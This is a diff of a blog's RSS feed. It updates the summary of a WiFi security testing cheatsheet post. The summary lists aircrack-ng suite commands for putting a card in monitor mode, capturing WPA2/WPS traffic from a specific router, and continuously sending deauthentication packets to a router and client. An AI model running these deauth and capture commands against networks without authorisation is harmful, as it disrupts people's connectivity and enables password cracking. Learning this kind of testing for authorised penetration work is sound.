@@ -93,9 +93,8 @@ We&amp;rsquo;ll start by taking a snapshot of the dataset we want to move.</desc
       <pubDate>Tue, 10 Oct 2017 16:38:19 UTC</pubDate>
       
       <guid>https://danthesalmon.com/wifi-security-testing-cheatsheet/</guid>
-      <description>Prepare Wireless Card  View Network Cards: iwconfig Kill Wireless Processes: airmon-ng check kill  View Networks airodump-ng wlan0
-Capture traffic airodump-ng &amp;ndash;bssid 04:A1:51:9F:98:BB &amp;ndash;wps &amp;ndash;write ISSO-WPA2 &amp;ndash;channel 6 wlan0
-where: * &amp;ndash;bssid - MAC of router * &amp;ndash;wps - Output WPS information, may be able to try Reaver * &amp;ndash;write - File name to write to. No extension * &amp;ndash;channel - Statically set a channel. Don&amp;rsquo;t need to unless de-authing * wlan0 - Wireless interface</description>
+      <description>Prepare Wireless Card  View Network Cards:  iwconfig  Kill Wireless Processes:  airmon-ng check kill   View Networks airodump-ng wlan0  Capture traffic airodump-ng --bssid 04:A1:51:9F:98:BB --wps --write ISSO-WPA2 --channel 6 wlan0  where:
+ --bssid - MAC of router --wps - Output WPS information, may be able to try Reaver --write - File name to write to. No extension --channel - Statically set a channel. Don&#39;t need to unless de-authing wlan0 - Wireless interface  Deauth - Do while capturing aireplay-ng --deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0  where:  0 - Continuously send deauth packets -a - BSSID of router (from airodump) -c - STATION of client (From airodump.</description>
     </item>
     
     <item>
